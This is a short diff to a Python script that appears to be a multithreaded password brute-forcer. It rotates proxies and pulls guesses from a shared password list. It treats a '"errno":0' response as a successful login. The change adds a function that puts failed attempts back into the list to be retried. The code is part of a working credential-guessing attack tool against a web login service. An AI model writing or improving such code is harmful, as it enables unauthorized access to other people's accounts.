@@ -54,6 +54,14 @@ def GetPwd():
         pwdlock.release()
         return ret
 
+def RecyclePwd(pwd):
+    if pwdlock.acquire(True):
+        global totpwd
+        pwddict.append(pwd)
+        totpwd+=1
+        pwdlock.release()
+        return
+
 proxylist=[]
 def GetProxy():
     global proxylist
@@ -159,6 +167,8 @@ def fuck():
         elif check.find(r'"errno":0') != -1:
             password=trying
             break
+        else:
+            RecyclePwd(trying)
         tot+=1
 
 threadid=[]
